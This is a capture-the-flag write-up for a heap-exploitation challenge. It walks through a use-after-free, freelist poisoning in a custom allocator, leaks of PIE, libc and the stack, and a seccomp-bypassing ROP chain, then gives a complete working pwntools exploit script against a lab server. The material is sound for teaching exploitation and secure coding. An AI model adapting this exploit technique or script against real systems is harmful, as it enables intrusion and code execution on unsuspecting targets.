# The Slab Vault — A Beginner-Friendly Write-up

- **Category:** pwn (binary exploitation)
- **What makes it interesting:** a *custom* memory allocator (not the normal glibc heap), a use-after-free bug, freelist poisoning, building a reusable arbitrary read/write primitive, and finally bypassing `seccomp` with an "open-read-write" ROP chain.
- **Server:** `nc 172.16.38.22 1337`
- **Flag:** `bcsctf{sl4b_fr33l1st_p01s0n_2_0rw_s3cc0mp_f448c9}`

---

## 0. What you need to know first (the crash course)

If you already do pwn, skip ahead. If you don't, read this — the rest of the write-up assumes these words.

- **PIE** — the program is loaded at a *random* base address every run. To exploit it, we usually need to *leak* one real address, then subtract a known offset to recover the "base". Every other address becomes `base + known_offset`.
- **Full RELRO** — the GOT (a table of function pointers) is made read-only, so we can't overwrite it. We'll have to attack something else (a return address on the stack).
- **Canary / NX / CET** — standard mitigations. Canary guards against straight stack-smashing overflows; NX makes the stack non-executable (so we use ROP, not shellcode); CET is marked but *not enforced* on this host.
- **libc** — the C standard library. Once we leak its base, we get all its gadgets and functions.
- **seccomp** — a filter that blocks certain syscalls. Here it blocks `execve` (no shell!), so instead of popping a shell we must **O**pen the flag file, **R**ead it, **W**rite it to us — the classic **ORW** trick.
- **ROP (Return-Oriented Programming)** — instead of injecting code, we chain together tiny snippets ("gadgets") that already exist in libc, each ending in `ret`, to perform syscalls by hand.

The flag file `/flag` is owned by root and readable by everyone (`444`), so we don't need root — we just need the program to read the file *for us*.

---

## 1. The program: a "Vault" of records

The binary is a menu-driven program. It stores up to **16 records** in a fixed array. Each record is `0x28` (40) bytes and looks like this:

```
offset  field
+0x00   active   (4 bytes)  -> is this slot in use?
+0x04   title    (12 bytes) -> a short name you type
+0x10   fptr     (8 bytes)  -> a FUNCTION POINTER, defaults to pie+0x1720
+0x18   size     (8 bytes)  -> how many bytes of data
+0x20   data     (8 bytes)  -> POINTER to the record's data buffer
```

The record array lives at a fixed offset from the program base: `pie + 0x5060`. That detail matters a lot later.

### The menu options

1. **Create** — you pick a slot (0–15) and a size (1–256). The program allocates a buffer, copies your 12-byte title in, and sets `fptr = pie+0x1720`.
2. **Edit** — reads *exactly* `size` bytes into the record's `data` buffer. (Bounded — no overflow here.)
3. **View** — does three things, in order:
   - `puts(title)` — prints the title,
   - `if (fptr) fptr(&title)` — **calls the function pointer**,
   - `write(1, data, size)` — prints the raw data.
4. **Delete** — frees `data`, then zeros out `active`, `size`, and `data`… **but not `fptr`**.
5. **Clone(src → dst)** — `memcpy`s the whole 40-byte struct from one slot to another, **including the `data` pointer**.

---

## 2. The custom allocator (the "slab")

The challenge doesn't use the normal heap. At startup it `mmap`s a big region and hands out chunks from it using a simple **LIFO freelist** ("last freed, first reused"). There are two size classes: **0x80** and **0x100**.

Each chunk has an 8-byte header, then the user data:

```
[ "SLAB" (4) | reqsize (2) | classsize (2) ]  <- 8-byte header
[ user data .......................... ]      <- "user pointer" = chunk + 8
```

Here's the crucial design flaw, and it's a *classic* one: **when a chunk is freed, the allocator stores the "next free chunk" pointer inside the user data area** (right where your data used to be). So a freed chunk's first 8 bytes become a `next` link in the freelist.

This means: if we can still *write* to a chunk after it's been freed, we control the `next` pointer — and therefore we control *where the allocator hands out memory next*. This is **freelist poisoning**.

---

## 3. The bugs, in plain English

**Bug 1 — Clone copies the `data` pointer.**
After `clone(0 → 2)`, records 0 and 2 both point at the *same* buffer. Free one and the other still points at freed memory → **use-after-free (UAF)** and **double-free**.

**Bug 2 — View leaks `fptr` for free.**
View prints the title with `puts`, and the title sits right before `fptr` in memory. `puts` keeps printing until it hits a null byte. Since `fptr = pie+0x1720` has non-zero low bytes, `puts` runs straight past the 12-byte title and spits out the function pointer too. Subtract `0x1720` → **PIE base leaked**, with zero heap trickery.

**Bug 3 — View calls a per-record function pointer, and Delete doesn't clear it.**
Combined with the alias/UAF from Bug 1, this lets us reach freed chunks through the surviving record and poison the freelist.

---

## 4. The exploit, step by step

### Step 1 — Leak PIE

Create a record, View it, read the bytes after the title. That's `fptr`. Compute:

```
PIE = fptr - 0x1720
```

Now every program address is known.

### Step 2 — Build a reusable arbitrary read/write

This is the clever part. The goal is to make one record's `data` pointer point at **another record's struct**, so that editing the first record lets us *forge a fake record* — and a fully-controlled fake record gives us read/write anywhere.

We target size class `0x80`. The sequence:

1. `create 0`, `create 1`.
2. `clone 0→2`, `clone 1→3`. Now records 2 and 3 alias the buffers of 0 and 1.
3. `delete 1`, `delete 0`. The freelist now looks like: head → chunk0 → chunk1. Records 2 and 3 still *dangle* onto those freed chunks.
4. `edit 2` — record 2 still points at freed chunk0, so this writes into freed memory. We set `chunk0.next = rec14 - 8`, where `rec14 = pie + 0x5060 + 14*0x28` (the address of record slot 14's struct).
5. `create 4` — pops chunk0 off the freelist.
6. `create 6` — pops `rec14 - 8`. The allocator returns `rec14 - 8 + 8 = rec14`, so now **record 6's `data` pointer equals the address of record 14's struct**.

Now `edit(6)` writes 40 bytes straight onto record 14's struct. We *forge* record 14 to say: `{active:1, fptr:0, size:N, data:TARGET}`.

- `view(14)` → reads N bytes from `TARGET` (arbitrary read)
- `edit(14)` → writes N bytes to `TARGET` (arbitrary write)

And because we can re-forge record 14 anytime through record 6, this is **fully reusable**. In the exploit these are the `arb_read` / `arb_write` helpers.

### Step 3 — Leak libc

We can't read the GOT (Full RELRO made it read-only), and our write primitive scribbles an 8-byte header at `TARGET-8`, so we need a *writable* target. We read a copy of the `stdout` pointer that lives in writable `.bss` at `pie+0x5020`:

```
libc = leak - 0x21b780
```

### Step 4 — Leak a stack address

libc exports `environ`, a global that always holds a pointer to the process environment on the stack:

```
stack_addr = arb_read(libc + environ_offset)
```

### Step 5 — Find the return-address slot to hijack

We can't smash a return address with an overflow (there's a canary, and Edit is bounded). Instead we **overwrite a return address directly** with our arbitrary write.

We dump a 0x800-byte window of the stack and search for the value `pie+0x15d5` — that's the return address left behind by the menu's `call view`. Because every menu handler is called from the same place in the loop, that slot's *address* is stable. That's where our ROP chain will go.

### Step 6 — ORW ROP chain

Because `seccomp` blocks `execve`, we can't get a shell. So we hand-build these three syscalls out of libc gadgets:

```
open("/flag", 0)      -> returns fd 3
read(3, buf, 0x100)   -> reads the flag into a buffer
write(1, buf, 0x100)  -> prints it to us
```

(The program `close()`s fds 3–19 at startup, so `open` reliably returns fd 3.)

Gadgets used (libc-relative):
`pop rdi 0x2a3e5`, `pop rsi 0x2be51`, `pop rdx;pop rbx 0x90469`, `pop rax 0x45eb0`, `syscall 0x912d6`.

**The neat trigger:** we write the ROP chain *starting at the handler-return slot* using `edit(14)`. But `edit` itself returns through that very same slot! So after `edit` finishes and tail-calls `puts("Vault updated!")`, when `puts` returns — instead of going back to the menu — it lands on our ROP chain. The flag gets `open`ed, `read`, and `write`n to us.

---

## 5. The flag

```
bcsctf{sl4b_fr33l1st_p01s0n_2_0rw_s3cc0mp_f448c9}
```

## How to run

```bash
python3 exploit.py remote   # against 172.16.38.22:1337 (server is flaky; retry)
python3 exploit.py          # locally using the shipped ld/libc
```

---

## 6. The full exploit script

Here's the complete `exploit.py` that automates every step above. Read it alongside sections 4–5 — the comments line up with those phases.

```python
#!/usr/bin/env python3
from pwn import *
import sys
context.arch='amd64'; context.log_level='error'
D='/home/kali/Desktop/pwn7/slab-vault/deliverable-user'
LIBC=ELF(D+'/libc.so.6',checksec=False)
REMOTE = len(sys.argv)>1 and sys.argv[1]=='remote'
def start():
    if REMOTE: return remote('172.16.38.22',1337)
    return process([D+'/ld-linux-x86-64.so.2','--library-path',D,D+'/challenge'])
io=start()
def menu(c): io.recvuntil(b'> '); io.sendline(str(c).encode())
def create(idx,size,title=b'A'*12):
    menu(1); io.recvuntil(b'0-15): '); io.sendline(str(idx).encode())
    io.recvuntil(b'Size'); io.sendline(str(size).encode())
    io.recvuntil(b'Title'); io.send(title[:12].ljust(12,b'A')+b'\n'); io.recvuntil(b'!')
def edit(idx,data):
    menu(2); io.recvuntil(b'0-15): '); io.sendline(str(idx).encode())
    io.recvuntil(b'bytes): '); io.send(data)   # must be exactly record.size bytes
def view_raw(idx,n):
    menu(3); io.recvuntil(b'0-15): '); io.sendline(str(idx).encode())
    io.recvuntil(b'Data: '); return io.recv(n)
def delete(idx):
    menu(4); io.recvuntil(b'0-15): '); io.sendline(str(idx).encode()); io.recvuntil(b'!')
def clone(s,d):
    menu(5); io.recvuntil(b'Source index (0-15): '); io.sendline(str(s).encode())
    io.recvuntil(b'Destination index (0-15): '); io.sendline(str(d).encode()); io.recvuntil(b'!')

# ---- 1) PIE leak via title+fptr in view ----
create(0,0x28, b'A'*12)
menu(3); io.recvuntil(b'0-15): '); io.sendline(b'0')
io.recvuntil(b'Title: '); line=io.recvuntil(b'\n',drop=True)
fptr=u64(line[12:].ljust(8,b'\0')); pie=fptr-0x1720
log.warning(f"PIE=%#x", pie)
delete(0)
RA=pie+0x5060
rec14=RA+14*0x28    # forged handle
# ---- 2) poison (class 0x80, size 0x28) -> master record6.data = rec14 ----
create(0,0x28); create(1,0x28)
clone(0,2); clone(1,3)
delete(1); delete(0)
edit(2, p64(rec14-8).ljust(0x28,b'\x00'))   # chunk0.next = rec14-8 (edit writes size=0x28 bytes)
create(4,0x28)                               # pop chunk0
create(6,0x28)                               # pop rec14-8 -> record6.data = rec14
# record6.size is 0x28; edit(6) writes 0x28 bytes = forge record14
def forge14(addr,size,fptr14=0):
    edit(6, p32(1)+b'AAAAAAAAAAAA'[:12]+p64(fptr14)+p64(size)+p64(addr))
def arb_read(addr,n):
    forge14(addr,n); return view_raw(14,n)
def arb_write(addr,data):
    forge14(addr,len(data)); edit(14,data)

# ---- 3) libc via stdout copy at pie+0x5020 ----
libc_leak=u64(arb_read(pie+0x5020,8)[:8])
libc=libc_leak-0x21b780
log.warning("libc=%#x", libc)
# ---- 4) stack via environ ----
stack_env=u64(arb_read(libc+0x222200,8)[:8])
log.warning("environ->stack=%#x", stack_env)
# ---- 5) find handler ret slot (holds pie+0x15d5 during view) ----
WIN=0x800
base=stack_env-WIN
blk=arb_read(base,WIN)
target_val=pie+0x15d5
slot=None
for off in range(0,len(blk)-8,8):
    if u64(blk[off:off+8])==target_val:
        slot=base+off  # last match = most recent frame (deepest? highest addr)
log.warning("handler_ret_slot=%#x", slot if slot else 0)
if slot is None:
    log.error("ret slot not found; dump:")
    for off in range(0,len(blk),8):
        v=u64(blk[off:off+8])
        if pie<=v<pie+0x8000: print(hex(base+off),hex(v),"PIE+",hex(v-pie))
    io.interactive()
# ---- 6) build ORW ROP at slot ----
pop_rdi=libc+0x2a3e5; pop_rsi=libc+0x2be51; pop_rdx_rbx=libc+0x90469
pop_rax=libc+0x45eb0; syscall=libc+0x912d6
flag_addr=slot+0x100; buf=slot+0x180
chain=flat(
 pop_rdi, flag_addr, pop_rsi, 0, pop_rdx_rbx, 0,0, pop_rax,2, syscall,
 pop_rdi, 3, pop_rsi, buf, pop_rdx_rbx, 0x100,0, pop_rax,0, syscall,
 pop_rdi, 1, pop_rsi, buf, pop_rdx_rbx, 0x100,0, pop_rax,1, syscall,
)
payload=chain.ljust(0x100,b'\x00')+b'/flag\x00\x00\x00'+b'\x00'*(0x180-0x100-8)+b'\x00'*8
payload=payload[:0x200]
# write payload at slot (edit(14) as the trigger: its own ret is slot -> ROP after)
arb_write(slot,payload)
# after edit(14) returns via puts, ROP runs
out=io.recvall(timeout=5)
print(out.decode('latin1'))
m=re.search(rb'bcsctf\{[^}]*\}?',out)
if m: print("FLAG:",m.group().decode())
```

---

## 7. Lessons (why these bugs happened)

- **Never copy an owning pointer wholesale.** `Clone` duplicated the `data` pointer, so two records owned one buffer → aliasing, UAF, double-free. Fix: deep-copy the buffer, or refuse to clone live data.
- **Storing freelist links inside user data + a UAF = freelist poisoning.** Once an attacker controls a freed chunk's `next`, they control future allocations → arbitrary allocation → arbitrary read/write. Fix: keep allocator metadata out of user-writable memory, and detect double-frees.
- **Mitigations aren't a wall.** Full RELRO, PIE, and a canary don't stop a *data-only* arbitrary write. Overwriting a return address (without ever touching the canary) still gives code execution, and `seccomp` only downgrades the attacker from "shell" to "read the flag file" — it doesn't stop them.
